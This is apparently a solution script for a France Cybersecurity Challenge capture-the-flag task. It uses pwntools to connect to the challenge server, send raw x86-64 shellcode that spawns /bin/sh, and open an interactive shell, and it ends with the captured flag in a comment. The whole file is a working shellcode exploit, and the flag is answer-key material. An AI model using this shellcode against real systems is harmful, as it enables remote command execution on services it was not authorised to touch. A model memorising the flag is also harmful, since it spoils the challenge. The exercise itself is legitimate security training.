#!/usr/bin/python3

from pwn import *

p = remote("challenges.france-cybersecurity-challenge.fr", "2051")

p.sendline(b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")
p.interactive()

# Flag is: FCSC{9f8a2eb6fbb26644dab670f1a948c449ba36102417efc3e40c3bd4774bfb4f7a}
